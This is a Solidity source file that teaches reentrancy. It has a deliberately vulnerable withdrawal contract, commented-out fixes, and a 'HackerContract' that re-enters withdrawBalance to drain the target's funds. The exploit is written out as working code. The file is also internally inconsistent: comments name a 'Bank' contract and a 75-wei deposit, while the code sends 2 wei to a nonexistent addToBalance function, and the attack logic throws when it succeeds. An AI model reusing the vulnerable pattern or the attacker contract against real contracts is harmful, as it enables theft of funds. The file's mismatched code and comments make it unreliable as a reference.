pragma solidity ^0.4.24;

// One of the major dangers of calling external contracts is that they can take over the control flow, and make changes to your data that the calling function wasn't expecting.
contract VulnerableContract{

    // Let's say we have a mapping of balances of users contributions
    mapping (address => uint) private userBalances;

    // Payable function which will increase the balance maintained by the contract for the respective contributor
    function () payable {
        userBalances[msg.sender] += msg.value;
    }

    // Try figuring out the possible flaw by looking at the code below
    
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        require(msg.sender.call.value(amountToWithdraw)()); 
        userBalances[msg.sender] = 0;
    }
    

    // In the second line of the above function the caller's code is executed which can call withdrawBalance again and withdraw balance till the time the contract has 0 balance
    // This can happen because the above function allows the control to be moved to another contract since "msg.sender.call.value(amountToWithdraw)()" doesn't know if the msg.sender is a contract address or a regular wallet address
    
    // A more safer approach for the same function would be to use send() instead of call.value()()
    /*
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        msg.sender.send(amountToWithdraw); 
        userBalances[msg.sender] = 0;
    }
    */

    // Another alternative/sub-optimal approach would be to update the user balance before the transfer of ethers is done
    /*
    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        require(msg.sender.call.value(amountToWithdraw)()); // The user's balance is already 0, so future invocations won't withdraw anything
    }
    */

}

contract HackerContract{
    /*This is the malicious contract that implements a double spend attack to the
first contract: contract VulnerableContract. This attack can be carried out n times i.e. 
till the time there is enough balance in the VulnerableContract.
For this example, we carried it out only 2 times.*/

   bool is_attack;
   address hackerAddress;

   function  HackerContract(address _hackerAddress, bool _is_attack){
       hackerAddress = _hackerAddress;
       is_attack = _is_attack;
   }/*This function, which is the constructor, sets the address of the contract to be attacked
   (contract Bank) and enables/disables the double spend attack */

   function() {

       if(is_attack==true)
       {
           is_attack=false;
           if(hackerAddress.call(bytes4(sha3("withdrawBalance()")))) {
               throw;
           }
       }
   }/* This is the fallback function that calls the withdrawnBalance function 
   when attack flag, previuosly set in the constructor, is enabled. This function
   is triggered because in the withdrawBalance function of the contract Bank a
   send was executed. To avoid infinitive recursive fallbacks, it is necessary
   to set the variable is_attack to false. Otherwise, the gas would run out, the
   throw would execute and the attack would fail */

   function  deposit(){

        if(hackerAddress.call.value(2).gas(20764)(bytes4(sha3("addToBalance()")))
        ==false) {
               throw;
           }

   }/*This function makes a deposit in the contract Bank (75 wei) calling the
   addToBalance function of the contract Bank*/

   function  withdraw(){

        if(hackerAddress.call(bytes4(sha3("withdrawBalance()")))==false ) {
               throw;
           }

   }/*This function triggers the withdrawBalance function in the contract Bank*/
}
